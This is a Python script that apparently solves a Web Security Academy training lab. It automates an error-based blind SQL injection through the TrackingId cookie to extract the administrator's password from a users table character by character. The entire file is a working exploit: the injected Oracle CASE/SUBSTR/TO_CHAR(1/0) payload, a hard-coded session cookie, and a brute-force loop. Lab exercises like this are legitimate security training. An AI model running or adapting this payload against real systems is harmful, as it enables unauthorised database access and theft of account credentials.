import requests
from bs4 import BeautifulSoup
import string

alphanumeric_lower = string.digits + string.ascii_lowercase
alphanumeric_lower_list = list(alphanumeric_lower)

# set your url for lab
url = "https://0a0800c0039b518980a6173000f200f1.web-security-academy.net/"
password = ""
i = 0

while i < 36:
    guess = password + alphanumeric_lower_list[i]
    lg = len(guess)

    TrackingId = f"qBayghYvyBDLLWZW' ||(SELECT CASE WHEN SUBSTR(password,1,{lg})='{guess}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    print(TrackingId)

    cookies = {
        "session": "5ei5ZLjrCLIseLNEeEjkMZf6Xg9MFqhI",
        "TrackingId": TrackingId
    }

    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")

    is_warning = soup.find(class_="is-warning")

    if is_warning:
        password = guess
        i = 0
        print(True)
    else:
        i += 1
        print(False)

print("Password: ", password)